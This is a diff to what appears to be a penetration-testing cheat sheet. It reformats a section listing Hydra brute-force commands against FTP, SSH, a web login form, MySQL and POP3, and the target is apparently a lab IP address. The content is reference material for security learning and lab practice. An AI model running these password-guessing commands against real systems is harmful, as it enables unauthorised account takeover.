@@ -41,12 +41,13 @@ set USERNAME admin
 ->run
 ```
 ### 7. Hydra
-``` Use for FTP:
-         $ hydra -l user -P passlist.txt ftp://IP
-    Use for SSH:
-         $ hydra -l <username> -P passwdlist.txt IP -t 4 ssh
-    Use for Web Post:
-         $ hydra -l <username> -P <wordlist> 10.10.46.122 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V
+``` 
+ Use for FTP:
+     $ hydra -l user -P passlist.txt ftp://IP
+ Use for SSH:
+     $ hydra -l <username> -P passwdlist.txt IP -t 4 ssh
+ Use for Web Post:
+     $ hydra -l <username> -P <wordlist> 10.10.46.122 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V
 
 - hydra -L usernames.txt -P pass.txt <IP> mysql
 - hydra -l USERNAME -P /path/to/passwords.txt -f <IP> pop3 -V`
